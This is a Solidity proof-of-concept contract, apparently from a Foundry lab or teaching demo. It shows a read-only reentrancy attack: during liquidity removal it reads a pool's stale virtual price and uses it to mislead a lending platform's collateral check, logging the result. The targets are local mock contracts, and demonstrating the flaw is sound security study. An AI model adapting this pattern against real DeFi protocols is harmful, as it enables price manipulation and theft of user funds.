// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "./DeFiPool.sol";
import "./LendingPlatform.sol";
import "forge-std/console.sol";

contract ReadOnlyAttack {
    DeFiPool public pool;
    LendingPlatform public lending;

    constructor(address _pool, address _lending) {
        pool = DeFiPool(_pool);
        lending = LendingPlatform(_lending);
    }

    receive() external payable {
        uint256 stalePrice = pool.getVirtualPrice();
        console.log("Stale price inside reentrancy:", stalePrice);

        uint256 fakeValue = lending.checkCollateralValue();
        console.log("Lending platform fooled! Price is:", fakeValue);
    }

    function setupAttack() external payable {
        pool.addLiquidity{value: msg.value}();
    }

    function executeExploit() external {
        pool.removeLiquidity(10 ether);
    }
}
